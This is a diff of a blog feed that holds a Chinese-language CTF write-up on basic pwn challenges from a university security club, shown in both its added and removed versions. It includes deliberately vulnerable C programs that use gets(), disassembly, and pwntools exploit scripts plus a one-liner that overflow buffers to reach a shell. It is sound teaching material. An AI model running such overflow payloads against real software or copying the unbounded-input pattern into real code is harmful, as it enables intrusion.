+<p>平常剛拿到題目比較會用到的幾個指令(以我來說)</p>
+<ul>
+<li><code>ls -al</code> 瞭解目錄下的檔案以及執行權限</li>
+<li><code>file</code> 確認檔案類型以及位元數</li>
+<li><code>checksec</code> 查看該ELF檔開啟了哪些保護機制</li>
+</ul>
+<br>
+那接下來就開始解題囉！ovo
+<br>
+
+<h2 id="0x01-password"><a href="#0x01-password" class="headerlink" title="0x01: password"></a>0x01: password</h2><p>首先，來看一下這題提供的檔案。</p>
+<blockquote>
+<p>password<br>password.c<br>flag.txt</p>
+</blockquote>
+<p>第一個檔案<code>password</code>用<code>file</code>指令可以查看關於password的檔案類型。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file ./password</span></span><br><span class="line">password: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=78715d2680bfeafa1b0a97978bfe8816be4d8423, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>可以發現是屬於Linux OS底下的ELF執行檔，也是CTF內最常見的檔案類型，不過用MacOS的Safari載下來都會莫名被加上<code>.dms</code>，當時第一次看到還在思考檔案是不是壞了XD（用<code>file</code>查看是沒有問題），另外社課提供的Pwn基礎題以<code>32-bits</code>為主，據說是比較好拿來練習(?)</p>
+<p>再來就是直接執行看看… 咦？不能執行？</p>
+<p>用<code>ls</code>發現這個檔案並沒有執行權限，可以用<code>chmod</code>改檔案權限<br>對其他細節有興趣的可以去Google <strong>鳥哥私房菜</strong> 瞭解一下<code>Linux的檔案權限與目錄配置</code>。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls -al</span><br><span class="line">-rw-r-xr-x@ [other information] password</span><br><span class="line">$ chmod +x .&#x2F;password</span><br><span class="line">$ ls -al</span><br><span class="line">-rwxr-xr-x@ [other information] password</span><br></pre></td></tr></table></figure>
+
+<p>修改完執行權限後可以先run一下看看程式大概要幹嘛。<br>在Pwn基礎題通常會刻意把一些<strong>防範機制</strong>關掉，可以拿<code>checksec</code>指令看看該執行檔開了哪些保護，以password這題來說。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec ./password</span></span><br></pre></td></tr></table></figure>
+<div class="note info">
+            <pre>Arch:     i386-32-little<br>RELRO:    <font color='EAC100'>Partial RELRO</font><br>Stack:    <font color='FF0000'>No canary found</font><br>NX:       <font color='009100'>NX enabled</font><br>PIE:      <font color='FF0000'>No PIE (0x8048000)</font><br></pre>
+          </div>
+
+<p>第一次見到這些保護機制不懂也很正常：）<br>白話來說就是</p>
+<ol>
+<li><code>RELRO</code>暫時還不會用到，主要適用於<strong>防範lazy Binding</strong>所造成的延伸問題</li>
+<li><code>canary</code>關閉能夠讓你的輸入超過指定長度蓋到一些奇怪的位址，簡單講就是能Buffer Overflow</li>
+<li><code>NX</code>開啟表示不讓你塞些邪惡的command在程式內執行，之後也會有這部分的練習</li>
+<li><code>PIE</code>關閉讓你分析執行檔時看到的會是”絕對位址”，若開啟就只看得到位址偏移量不容易拿來利用<br>（另外還有一個沒出現在<code>checksec</code>的<code>ASLR</code>，主要是對於每次執行stack、heap…的位址隨機化）</li>
+</ol>
+<p>之後根據社課這部分內容應該會再講詳細點，剛開始大概有個認知就行了。<br>然後，社課的基礎題還順便附了該執行程式的原始碼，佛心講師╭(⊙Д⊙)╯佛心講師╭(⊙Д⊙)╯</p>
+<figure class="highlight c"><figcaption><span>password.c</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">12</span>] = <span class="string">&quot;12345678&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s your name? &quot;</span>);</span><br><span class="line">    gets(name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(password, <span class="string">&quot;password&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Welcome :) &quot;</span>);</span><br><span class="line">        shell();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;QQ %s\n&quot;</span>, password);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>這段code對於有寫過程式的難民們(?)應該都不困難<br>題意要求輸入<code>name</code>，然後會拿變數<code>password</code>和”password”進行比較，判斷式成立就能執行<code>shell()</code><br>可以發現code中並沒有任何要求輸入變數<code>password</code>，只有在最後會輸出”QQ <code>password</code>“<br>若第一次接觸Pwn的看到這奇怪的判斷式應該會滿頭問號（笑）</p>
+<p>不過，我們可以先隨便輸入一些東西觀察看看<br>像是變數<code>name</code>大小為 8 bytes，輸入8字元”12345678”，會得到下面結果。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">What&#39;s your name? 12345678</span><br><span class="line">Hello 12345678</span><br><span class="line">QQ </span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
+
+<p>然而，如果輸入超過8個字元”1234567890”，會得到下列結果。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">What&#39;s your name? 1234567890</span><br><span class="line">Hello 1234567890</span><br><span class="line">QQ 90</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
+
+<p>嗯嗯？明明沒有對變數<code>password</code>輸入參數，但變數內容好像被偷改了XD</p>
+<p>沒錯！這題主要想表達的事情是</p>
+<blockquote>
+<p><code>gets()</code>這輸入函式是不安全的，因為它不會限制使用者的輸入長度<br>因此若在<strong>沒有canary的情況下</strong>很容易遭受<strong>Buffer Overflow</strong>攻擊</p>
+</blockquote>
+<p>以這題來說我們可以用反組譯指令<code>objdump</code>瞭解一下程式架構</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump -d -M intel ./password</span></span><br></pre></td></tr></table></figure>
+
+<p>Stack內容的部分畫成圖大概長得像這樣<br><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618818959/blog-posts/2020-03/20-stack-frame-1.webp" alt=" "></p>
+<p>我們這次輸入改成”aaaaaaaahaha”，”haha”就會蓋到變數<code>password</code>的值囉~<br><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618818959/blog-posts/2020-03/20-stack-frame-2.webp" alt=" "></p>
+<p>聰明的你應該知道怎麼做了吧 (｡･ω･｡)<br>沒有錯的啦！將上面的”haha”改成”password”就能啟動<code>shell()</code>拿到root權限了！</p>
+<p>話說回來<br>往後能夠透過手動輸入就破解的Pwn題並不常見<br>因此這類型的題目通常會搭配python套件<code>pwntool</code>進行exploit</p>
+<p>↓↓↓ 以這題來說用pwntool可以這樣寫 ↓↓↓</p>
+<figure class="highlight python"><figcaption><span>exploit.py</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># process:本機連線, remote:遠端連線</span></span><br><span class="line">conn = process(<span class="string">&#x27;./password&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根據程式內容設計輸入(payload)</span></span><br><span class="line">payload = <span class="string">&#x27;12345678password&#x27;</span></span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 傳送給程式後, 由於會執行shell需要用interactive()進行互動</span></span><br><span class="line">conn.sendline(payload) </span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>光是第一題就打了落落長XD<br>打Pwn一開始抓不到感覺還蠻正常der<br>所以我用step by step的方式希望能詳細一點<br>順便幫自己補充平常不太會深入的知識ovo+</p>
+<p>再來就繼續囉！</p>
+<br>
+0x02: bof
+---
+
+<p>這題給的檔案有</p>
+<blockquote>
+<p>bof<br>bof.c<br>flag.txt</p>
+</blockquote>
+<p>同樣flag.txt沒有讀取權限，老樣子先來看看<code>bof</code>執行檔有開了哪些保護</p>
+<div class="note info">
+            <pre>Arch:     i386-32-little<br>RELRO:    <font color='EAC100'>Partial RELRO</font><br>Stack:    <font color='FF0000'>No canary found</font><br>NX:       <font color='009100'>NX enabled</font><br>PIE:      <font color='FF0000'>No PIE (0x8048000)</font><br></pre>
+          </div>
+
+<p>唔嗯… 可以發現和上一題形式上十分類似，再來看看<code>bof.c</code>原始碼的內容</p>
+<figure class="highlight c"><figcaption><span>bof.c</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">48</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input: &quot;</span>);</span><br><span class="line">    gets(str);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>整體結構看起來和上一題沒什麼差別，也都是針對<code>gets()</code>的危險漏洞。<br>只是這次… 完全沒辦法執行<code>shell()</code>啊!!!</p>
+<p>這題主要想表達的事情是</p>
+<blockquote>
+<p>利用<code>gets()</code>不限輸入長度的漏洞進行Buffer Overflow<br>而且要把<code>vuln()</code>原本要回到<code>main()</code>的return address改成<code>shell()</code>的address</p>
+</blockquote>
+<p>「… 殺小!? ・ ࡇ ・」<br>嗯嗯嗯 我相信有學過OS和ASM的人是不會講出上面那句話der<br>可是就算懂歸懂，要怎麼做呢???</p>
+<p>先拿<code>objdump</code>一樣來看看裡頭長什麼樣子</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump -d -M intel ./bof</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">080484eb &lt;shell&gt;:</span><br><span class="line"> 80484eb:    55                       push   ebp</span><br><span class="line"> 80484ec:    89 e5                    mov    ebp,esp</span><br><span class="line"> 80484ee:    68 e0 85 04 08           push   0x80485e0</span><br><span class="line"> 80484f3:    e8 b8 fe ff ff           call   80483b0 &lt;system@plt&gt;</span><br><span class="line"> 80484f8:    83 c4 04                 add    esp,0x4</span><br><span class="line"> 80484fb:    90                       nop</span><br><span class="line"> 80484fc:    c9                       leave</span><br><span class="line"> 80484fd:    c3                       ret</span><br><span class="line"></span><br><span class="line">080484fe &lt;vuln&gt;:</span><br><span class="line"> 80484fe:    55                       push   ebp</span><br><span class="line"> 80484ff:    89 e5                    mov    ebp,esp</span><br><span class="line"> 8048501:    83 ec 30                 sub    esp,0x30</span><br><span class="line"> 8048504:    68 e8 85 04 08           push   0x80485e8</span><br><span class="line"> 8048509:    e8 82 fe ff ff           call   8048390 &lt;printf@plt&gt;</span><br><span class="line"> 804850e:    83 c4 04                 add    esp,0x4</span><br><span class="line"> 8048511:    8d 45 d0                 lea    eax,[ebp-0x30]</span><br><span class="line"> 8048514:    50                       push   eax</span><br><span class="line"> 8048515:    e8 86 fe ff ff           call   80483a0 &lt;gets@plt&gt;</span><br><span class="line"> 804851a:    83 c4 04                 add    esp,0x4</span><br><span class="line"> 804851d:    90                       nop</span><br><span class="line"> 804851e:    c9                       leave</span><br><span class="line"> 804851f:    c3                       ret</span><br></pre></td></tr></table></figure>
+
+<p>重點在line 18的<code>ebp-0x30</code>，必須要掌握變數所在的相對位置<br>把Stack frame畫成圖大概就是下面這樣：）<br><img src="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_482/v1618833040/blog-posts/2020-03/20-stack-frame-3.webp" alt=" "></p>
+<p>也就是說，這題希望我們除了把<code>str[48]</code>填滿<br>還要利用Buffer Overflow的方式把<code>shell()</code>的address蓋到return上。</p>
+<p>再來就是要知道line 1 <code>shell()</code>的function address<br>假如我們通通用”a”進行覆蓋，預期結果將會長這樣：）<br><img src="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_482/v1618833040/blog-posts/2020-03/20-stack-frame-4.webp" alt=" "></p>
+<p>既然知道要怎麼蓋return address，剩下的就是寫payload了。</p>
+<figure class="highlight python"><figcaption><span>exploit.py</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload分成三個部分: 填滿str[48], 覆蓋old ebp, 拿shell()覆蓋return address</span></span><br><span class="line"><span class="comment"># 要注意由於32位元是little-endian, 所以要用p32()轉成\xeb\x84\x04\x08的格式</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">48</span> + <span class="string">&#x27;aaaa&#x27;</span> + p32(<span class="number">0x080484eb</span>)</span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>這樣就能拿到root權限讀flag，當然如果懶得開檔案寫code，也是有一行流寫法XD</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> (python -c <span class="string">&quot;print(&#x27;a&#x27;*48 + &#x27;a&#x27;*4 + &#x27;\xeb\x84\x04\x08&#x27;)&quot;</span>; cat) | ./bof</span></span><br></pre></td></tr></table></figure>
+
+
+
+<br>
+Pwn大概就是這麼一回事了~
+寫的比預期還要久，而且原本想一篇講個三題，結果第一題介紹太久了(｡･ω･｡)
+
+<p>就醬，希望我還能繼續把題目補完（逃</p>
+]]></content>
+      <categories>
+        <category>Security</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Pwn Challenge</tag>
+        <tag>NSYSUISC</tag>
+      </tags>
   </entry>
   <entry>
     <title>【Project】Voronoi Diagram</title>
@@ -1211,7 +1335,7 @@
   <entry>
     <title>實驗室日誌 0x03</title>
     <url>/2020/574cc632ac6d/</url>
-    <content><![CDATA[<p><img src="https://photos.smugmug.com/photos/i-JVQBdT9/0/d70facc6/L/i-JVQBdT9-M.png?70%25"></p>
+    <content><![CDATA[<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_600/v1618835101/blog-posts/misc/meme-1.webp"></p>
 <p>剛好看完Pokemon新無印篇ep21，皮卡丘豪可愛哦 &gt;w&lt;</p>
 <p>這張圖不僅適用現在的碩一(看論文)，明年碩二還能再用一次~讚讚（幹</p>
 <a id="more"></a>
@@ -1230,209 +1354,6 @@
       <categories>
         <category>實驗室日誌</category>
       </categories>
-  </entry>
-  <entry>
-    <title>資安社課 Pwn basic(1)</title>
-    <url>/2020/b169a8a93bd8/</url>
-    <content><![CDATA[<p>經歷大約一學期的CTF洗禮，總算是對這分面稍微有些概念:D<br>原本已經這個部落格的定位應該要是技術向，殊不知都被我拿來發廢文…</p>
-<p>先說這篇的定位，總之作為第一篇writeup，決定拿社課的習題練練手<br>一方面是讓我自己在這方面的學習上可以邊寫邊延伸思考</p>
-<p>另外就是可以給些資訊科系但非資安背景的朋友簡單認識一下Pwn<br>否則每次被問到我也不曉得怎麼解釋（抹臉</p>
-<p>不會解釋資安… 應該是我的問題才對Orz</p>
-<a id="more"></a>
-
-<p>“<strong>Pwn</strong>“，有人唸Costco、有人唸IKEA，總之我都唸 “胖” 或是 “碰” 。<br>常見做法就是針對程式內的漏洞進行攻擊(提權)，有種”<strong>player has been owned.</strong>“的意思！<br>也有人說是Penetration(滲透) + Own(佔有)的組合，總之就大概是這種感覺w<br>在CTF領域，Pwn基礎題通常是給你無權讀取的文字檔(flag)，希望你透過程式漏洞拿到root權限拿flag。</p>
-<p>平常剛拿到題目比較會用到的幾個指令(以我來說)</p>
-<ul>
-<li><code>ls -al</code> 瞭解目錄下的檔案以及執行權限</li>
-<li><code>file</code> 確認檔案類型以及位元數</li>
-<li><code>checksec</code> 查看該ELF檔開啟了哪些保護機制</li>
-</ul>
-<br>
-那接下來就開始解題囉！ovo
-<br>
-
-<h2 id="0x01-password"><a href="#0x01-password" class="headerlink" title="0x01: password"></a>0x01: password</h2><p>首先，來看一下這題提供的檔案。</p>
-<blockquote>
-<p>password<br>password.c<br>flag.txt</p>
-</blockquote>
-<p>第一個檔案<code>password</code>用<code>file</code>指令可以查看關於password的檔案類型。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file ./password</span></span><br><span class="line">password: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=78715d2680bfeafa1b0a97978bfe8816be4d8423, not stripped</span><br></pre></td></tr></table></figure>
-
-<p>可以發現是屬於Linux OS底下的ELF執行檔，也是CTF內最常見的檔案類型，不過用MacOS的Safari載下來都會莫名被加上<code>.dms</code>，當時第一次看到還在思考檔案是不是壞了XD（用<code>file</code>查看是沒有問題），另外社課提供的Pwn基礎題以<code>32-bits</code>為主，據說是比較好拿來練習(?)</p>
-<p>再來就是直接執行看看… 咦？不能執行？</p>
-<p>用<code>ls</code>發現這個檔案並沒有執行權限，可以用<code>chmod</code>改檔案權限<br>對其他細節有興趣的可以去Google <strong>鳥哥私房菜</strong> 瞭解一下<code>Linux的檔案權限與目錄配置</code>。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls -al</span><br><span class="line">-rw-r-xr-x@ [other information] password</span><br><span class="line">$ chmod +x .&#x2F;password</span><br><span class="line">$ ls -al</span><br><span class="line">-rwxr-xr-x@ [other information] password</span><br></pre></td></tr></table></figure>
-
-<p>修改完執行權限後可以先run一下看看程式大概要幹嘛。<br>在Pwn基礎題通常會刻意把一些<strong>防範機制</strong>關掉，可以拿<code>checksec</code>指令看看該執行檔開了哪些保護，以password這題來說。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec ./password</span></span><br></pre></td></tr></table></figure>
-<div class="note info">
-            <pre>Arch:     i386-32-little<br>RELRO:    <font color='EAC100'>Partial RELRO</font><br>Stack:    <font color='FF0000'>No canary found</font><br>NX:       <font color='009100'>NX enabled</font><br>PIE:      <font color='FF0000'>No PIE (0x8048000)</font><br></pre>
-          </div>
-
-<p>第一次見到這些保護機制不懂也很正常：）<br>白話來說就是</p>
-<ol>
-<li><code>RELRO</code>暫時還不會用到，主要適用於<strong>防範lazy Binding</strong>所造成的延伸問題</li>
-<li><code>canary</code>關閉能夠讓你的輸入超過指定長度蓋到一些奇怪的位址，簡單講就是能Buffer Overflow</li>
-<li><code>NX</code>開啟表示不讓你塞些邪惡的command在程式內執行，之後也會有這部分的練習</li>
-<li><code>PIE</code>關閉讓你分析執行檔時看到的會是”絕對位址”，若開啟就只看得到位址偏移量不容易拿來利用<br>（另外還有一個沒出現在<code>checksec</code>的<code>ASLR</code>，主要是對於每次執行stack、heap…的位址隨機化）</li>
-</ol>
-<p>之後根據社課這部分內容應該會再講詳細點，剛開始大概有個認知就行了。<br>然後，社課的基礎題還順便附了該執行程式的原始碼，佛心講師╭(⊙Д⊙)╯佛心講師╭(⊙Д⊙)╯</p>
-<figure class="highlight c"><figcaption><span>password.c</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">12</span>] = <span class="string">&quot;12345678&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s your name? &quot;</span>);</span><br><span class="line">    gets(name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(password, <span class="string">&quot;password&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Welcome :) &quot;</span>);</span><br><span class="line">        shell();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;QQ %s\n&quot;</span>, password);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>這段code對於有寫過程式的難民們(?)應該都不困難<br>題意要求輸入<code>name</code>，然後會拿變數<code>password</code>和”password”進行比較，判斷式成立就能執行<code>shell()</code><br>可以發現code中並沒有任何要求輸入變數<code>password</code>，只有在最後會輸出”QQ <code>password</code>“<br>若第一次接觸Pwn的看到這奇怪的判斷式應該會滿頭問號（笑）</p>
-<p>不過，我們可以先隨便輸入一些東西觀察看看<br>像是變數<code>name</code>大小為 8 bytes，輸入8字元”12345678”，會得到下面結果。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">What&#39;s your name? 12345678</span><br><span class="line">Hello 12345678</span><br><span class="line">QQ </span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
-
-<p>然而，如果輸入超過8個字元”1234567890”，會得到下列結果。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">What&#39;s your name? 1234567890</span><br><span class="line">Hello 1234567890</span><br><span class="line">QQ 90</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
-
-<p>嗯嗯？明明沒有對變數<code>password</code>輸入參數，但變數內容好像被偷改了XD</p>
-<p>沒錯！這題主要想表達的事情是</p>
-<blockquote>
-<p><code>gets()</code>這輸入函式是不安全的，因為它不會限制使用者的輸入長度<br>因此若在<strong>沒有canary的情況下</strong>很容易遭受<strong>Buffer Overflow</strong>攻擊</p>
-</blockquote>
-<p>以這題來說我們可以用反組譯指令<code>objdump</code>瞭解一下程式架構</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump -d -M intel ./password</span></span><br></pre></td></tr></table></figure>
-
-<p>Stack內容的部分畫成圖大概長得像這樣<br><img src="https://photos.smugmug.com/photos/i-TcQ7Mhh/0/6d3aacdf/S/i-TcQ7Mhh-S.png"></p>
-<p>我們這次輸入改成”aaaaaaaahaha”，”haha”就會蓋到變數<code>password</code>的值囉~<br><img src="https://photos.smugmug.com/photos/i-jQZg5kx/0/f2aef2a7/S/i-jQZg5kx-S.png"></p>
-<p>聰明的你應該知道怎麼做了吧 (｡･ω･｡)<br>沒有錯的啦！將上面的”haha”改成”password”就能啟動<code>shell()</code>拿到root權限了！</p>
-<p>話說回來<br>往後能夠透過手動輸入就破解的Pwn題並不常見<br>因此這類型的題目通常會搭配python套件<code>pwntool</code>進行exploit</p>
-<p>↓↓↓ 以這題來說用pwntool可以這樣寫 ↓↓↓</p>
-<figure class="highlight python"><figcaption><span>exploit.py</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># process:本機連線, remote:遠端連線</span></span><br><span class="line">conn = process(<span class="string">&#x27;./password&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根據程式內容設計輸入(payload)</span></span><br><span class="line">payload = <span class="string">&#x27;12345678password&#x27;</span></span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 傳送給程式後, 由於會執行shell需要用interactive()進行互動</span></span><br><span class="line">conn.sendline(payload) </span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>光是第一題就打了落落長XD<br>打Pwn一開始抓不到感覺還蠻正常der<br>所以我用step by step的方式希望能詳細一點<br>順便幫自己補充平常不太會深入的知識ovo+</p>
-<p>再來就繼續囉！</p>
-<br>
-0x02: bof
----
-
-<p>這題給的檔案有</p>
-<blockquote>
-<p>bof<br>bof.c<br>flag.txt</p>
-</blockquote>
-<p>同樣flag.txt沒有讀取權限，老樣子先來看看<code>bof</code>執行檔有開了哪些保護</p>
-<div class="note info">
-            <pre>Arch:     i386-32-little<br>RELRO:    <font color='EAC100'>Partial RELRO</font><br>Stack:    <font color='FF0000'>No canary found</font><br>NX:       <font color='009100'>NX enabled</font><br>PIE:      <font color='FF0000'>No PIE (0x8048000)</font><br></pre>
-          </div>
-
-<p>唔嗯… 可以發現和上一題形式上十分類似，再來看看<code>bof.c</code>原始碼的內容</p>
-<figure class="highlight c"><figcaption><span>bof.c</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">48</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input: &quot;</span>);</span><br><span class="line">    gets(str);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>整體結構看起來和上一題沒什麼差別，也都是針對<code>gets()</code>的危險漏洞。<br>只是這次… 完全沒辦法執行<code>shell()</code>啊!!!</p>
-<p>這題主要想表達的事情是</p>
-<blockquote>
-<p>利用<code>gets()</code>不限輸入長度的漏洞進行Buffer Overflow<br>而且要把<code>vuln()</code>原本要回到<code>main()</code>的return address改成<code>shell()</code>的address</p>
-</blockquote>
-<p>「… 殺小!? ・ ࡇ ・」<br>嗯嗯嗯 我相信有學過OS和ASM的人是不會講出上面那句話der<br>可是就算懂歸懂，要怎麼做呢???</p>
-<p>先拿<code>objdump</code>一樣來看看裡頭長什麼樣子</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump -d -M intel ./bof</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">080484eb &lt;shell&gt;:</span><br><span class="line"> 80484eb:    55                       push   ebp</span><br><span class="line"> 80484ec:    89 e5                    mov    ebp,esp</span><br><span class="line"> 80484ee:    68 e0 85 04 08           push   0x80485e0</span><br><span class="line"> 80484f3:    e8 b8 fe ff ff           call   80483b0 &lt;system@plt&gt;</span><br><span class="line"> 80484f8:    83 c4 04                 add    esp,0x4</span><br><span class="line"> 80484fb:    90                       nop</span><br><span class="line"> 80484fc:    c9                       leave</span><br><span class="line"> 80484fd:    c3                       ret</span><br><span class="line"></span><br><span class="line">080484fe &lt;vuln&gt;:</span><br><span class="line"> 80484fe:    55                       push   ebp</span><br><span class="line"> 80484ff:    89 e5                    mov    ebp,esp</span><br><span class="line"> 8048501:    83 ec 30                 sub    esp,0x30</span><br><span class="line"> 8048504:    68 e8 85 04 08           push   0x80485e8</span><br><span class="line"> 8048509:    e8 82 fe ff ff           call   8048390 &lt;printf@plt&gt;</span><br><span class="line"> 804850e:    83 c4 04                 add    esp,0x4</span><br><span class="line"> 8048511:    8d 45 d0                 lea    eax,[ebp-0x30]</span><br><span class="line"> 8048514:    50                       push   eax</span><br><span class="line"> 8048515:    e8 86 fe ff ff           call   80483a0 &lt;gets@plt&gt;</span><br><span class="line"> 804851a:    83 c4 04                 add    esp,0x4</span><br><span class="line"> 804851d:    90                       nop</span><br><span class="line"> 804851e:    c9                       leave</span><br><span class="line"> 804851f:    c3                       ret</span><br></pre></td></tr></table></figure>
-
-<p>重點在line 18的<code>ebp-0x30</code>，必須要掌握變數所在的相對位置<br>把Stack frame畫成圖大概就是下面這樣：）<br><img src="https://photos.smugmug.com/photos/i-vmX8nT2/0/b97de34e/S/i-vmX8nT2-S.png"></p>
-<p>也就是說，這題希望我們除了把<code>str[48]</code>填滿<br>還要利用Buffer Overflow的方式把<code>shell()</code>的address蓋到return上。</p>
-<p>再來就是要知道line 1 <code>shell()</code>的function address<br>假如我們通通用”a”進行覆蓋，預期結果將會長這樣：）<br><img src="https://photos.smugmug.com/photos/i-nWpmnNR/0/654a0485/S/i-nWpmnNR-S.png"></p>
-<p>既然知道要怎麼蓋return address，剩下的就是寫payload了。</p>
